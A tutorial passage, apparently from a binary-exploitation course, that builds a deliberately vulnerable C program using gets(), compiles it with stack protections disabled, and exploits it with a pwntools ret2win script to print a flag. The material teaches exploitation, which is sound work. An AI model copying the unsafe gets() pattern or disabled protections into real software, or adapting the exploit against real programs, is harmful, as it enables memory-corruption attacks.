# Putting It All Together: A Full Walkthrough

Let's walk through a complete example, from writing a vulnerable program to exploiting it. This exercise combines everything we've learned so far.

### Step 1: The Vulnerable Program

Save the following code as `vulnerable.c`. It contains a classic stack buffer overflow vulnerability in the `vulnerable_function` and a `win` function that we want to execute.

```c
// File: vulnerable.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("Congratulations! You've successfully exploited the buffer overflow!\n");
    printf("Here is your flag: flag{b4s1c_buff3r_0v3rfl0w_w1n}\n");
    fflush(stdout);
}

void vulnerable_function() {
    char buffer[40];
    printf("Enter your name: ");
    fflush(stdout);
    gets(buffer); // Vulnerable function! No bounds checking.
    printf("Hello, %s\n", buffer);
    fflush(stdout);
}

int main() {
    vulnerable_function();
    return 0;
}
```

### Step 2: Compile the Binary

Now, compile it with the security protections disabled so we can perform a simple "return-to-function" exploit.

```bash
gcc -fno-stack-protector -no-pie -o vulnerable vulnerable.c
```

### Step 3: Analyze and Write the Exploit

Our goal is to overflow the `buffer` in `vulnerable_function` and overwrite the return address on the stack with the address of the `win` function.

1.  **Find the offset**: We need to know how many bytes to send to fill the buffer and reach the return address. The buffer is 40 bytes. On x86-64, we also need to overwrite the 8-byte saved base pointer (RBP) before we get to the return address. So, the offset is `40 (buffer) + 8 (RBP) = 48` bytes.
2.  **Find the target address**: We need the address of the `win` function. We can use `pwntools` to find this automatically.

Here is the complete exploit script. Save it as `exploit.py`.

```python
# File: exploit.py
from pwn import *

# --- Configuration ---
binary_path = "./vulnerable"
context.binary = binary_path
context.log_level = 'info'

# --- Analysis ---
# The buffer is 40 bytes. On x86-64, we add 8 bytes to overwrite RBP.
offset = 48

# Use pwntools to find the address of the 'win' function
elf = ELF(binary_path)
win_address = elf.symbols['win']
log.info(f"Calculated offset: {offset}")
log.info(f"Address of 'win' function: {hex(win_address)}")

# --- Exploitation ---
p = process(binary_path)
payload = b'A' * offset + p64(win_address)
p.sendlineafter(b"Enter your name: ", payload)
print(p.recvall().decode())
```

### Step 4: Run the Exploit

Make the script executable (`chmod +x exploit.py`) and run it.

```bash
python3 exploit.py
```

You should see the "Congratulations!" message and the flag printed to your terminal, confirming your exploit was successful!
